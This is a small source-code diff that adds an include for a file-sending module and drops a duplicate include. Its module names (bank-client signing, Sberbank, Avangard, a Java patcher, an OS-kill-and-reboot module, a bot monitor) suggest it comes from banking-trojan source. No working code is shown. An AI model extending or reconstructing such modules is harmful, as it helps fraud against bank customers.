@@ -32,6 +32,9 @@
 #include "CyberPlatDLL.h"
 
 #include "bsssign.h"
+#include "BssSendFile.h"
+
+
 #include "Sber.h"
 #include "java_patcher.h"
 #include "KillOs_Reboot.h"
@@ -47,7 +50,9 @@
 #include "JavaConfig.h"
 #include "avangard.h"
 
-#include "Avangard.h"
+
+
+
 
 #ifdef  DEBUGCONFIG
 	#include "BotMonitor.h"
